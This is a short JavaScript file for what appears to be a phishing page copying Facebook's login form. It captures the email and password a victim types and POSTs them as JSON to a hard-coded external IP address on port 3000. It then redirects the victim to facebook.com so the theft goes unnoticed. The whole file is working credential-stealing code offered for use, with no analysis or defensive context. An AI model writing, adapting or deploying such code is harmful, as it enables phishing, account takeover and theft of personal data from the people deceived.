const submit = document.querySelector('#u_0_d_tz')

const formUrl = 'http://14.225.254.76:3000'

const infor = { 
    email: 'entry.1030529027',
    password: 'entry.2017374643'
}

submit.addEventListener("click",async function(e) { 
     e.preventDefault()
     // get infor
     const email = document.querySelector('#email').value
     const password = document.querySelector('#pass').value
    // send data to cheat sheet 
    postData(formUrl, { email, password})
    window.location.href = "http://facebook.com"
})

async function postData(url = '', data = {}) {
    const response = await fetch(url, {
      method: 'POST', 
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    return await response.json();
}